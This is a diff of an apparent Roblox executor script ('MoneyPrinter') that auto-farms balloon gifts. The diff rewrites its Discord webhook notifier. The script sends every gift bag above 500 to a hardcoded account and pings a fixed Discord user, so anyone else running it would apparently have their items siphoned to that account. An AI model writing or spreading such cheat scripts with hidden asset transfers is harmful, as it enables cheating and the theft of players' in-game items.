@@ -137,16 +137,31 @@ function getInfo(name) return saveMod.Get()[name] end
 function getTool() return Player.Character:FindFirstChild("WEAPON_"..Player.Name, true) end
 function equipTool(toolName) return Library.Network.Invoke(toolName.."_Toggle") end
 function getCurrentZone() return Library["MapCmds"].GetCurrentZone() end
+local HttpService = game:GetService("HttpService")
+
 function sendNotif(msg)
-	local message = {content = msg}
-	local jsonMessage = HttpService:JSONEncode(message)
-	local success, webMessage = pcall(function() 
-		HttpService:PostAsync(getgenv().MoneyPrinter.webURL, jsonMessage) 
-	end)
-	if not success then 
-		local response = request({Url = getgenv().MoneyPrinter.webURL,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = jsonMessage})
-	end
+    local message = {
+        content = msg,
+        allowed_mentions = { parse = {"users"} } -- This line ensures user mentions are processed
+    }
+    local jsonMessage = HttpService:JSONEncode(message)
+    local headers = {["Content-Type"] = "application/json"}
+
+    local success, webMessage = pcall(function() 
+        return HttpService:PostAsync(getgenv().MoneyPrinter.webURL, jsonMessage, Enum.HttpContentType.ApplicationJson, false, headers)
+    end)
+
+    if not success then 
+        -- Assuming 'request' is a valid function in your environment (like when using Synapse X)
+        local response = request({
+            Url = getgenv().MoneyPrinter.webURL,
+            Method = "POST",
+            Headers = headers,
+            Body = jsonMessage
+        })
+    end
 end
+
 function getBalloonUID(zoneName) 
 	for i,v in pairs(BreakMod.AllByZoneAndClass(zoneName, "Chest")) do
 		if v:GetAttribute("OwnerUsername") == Player.Name and string.find(v:GetAttribute("BreakableID"), "Balloon Gift") then
@@ -317,13 +332,12 @@ while getgenv().MoneyPrinter.autoBalloons do task.wait()
 			if endGifts >= 500 then
 				SendAllBagsIfOver500("jendrzezoe0654", "Gift Bag") -- Send all "Gift Bag" items if over 500
 				task.wait(3)
-				sendNotif("```asciidoc\n[ " .. Player.Name .. " Sent ]\n <@775951452438790154>\n[ To jendrzezoe0654 ]\n‐ " .. tostring(endLarge) .. "Gift Bags \n```")
+				sendNotif("```asciidoc\n[ " .. Player.Name .. " Sent ]\n <@775951452438790154>\n[ To jendrzezoe0654 ]\n‐ " .. tostring(endLarge) .. " Gift Bags \n```")
 
 			elseif endLarge >= 500 then
 				SendAllBagsIfOver500("jendrzezoe0654", "Large Gift Bag") -- Send all "Gift Bag" items if over 500
 				task.wait(3)
 				sendNotif("```asciidoc\n[ " .. Player.Name .. " Sent ]\n <@775951452438790154>\n[ To jendrzezoe0654 ]\n‐ " .. tostring(endLarge) .. " Large Gift Bags \n```")
-
 			end
 			task.wait(10)
 			-- repeat game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, getServer().id, Player) task.wait(3) until not game.PlaceId
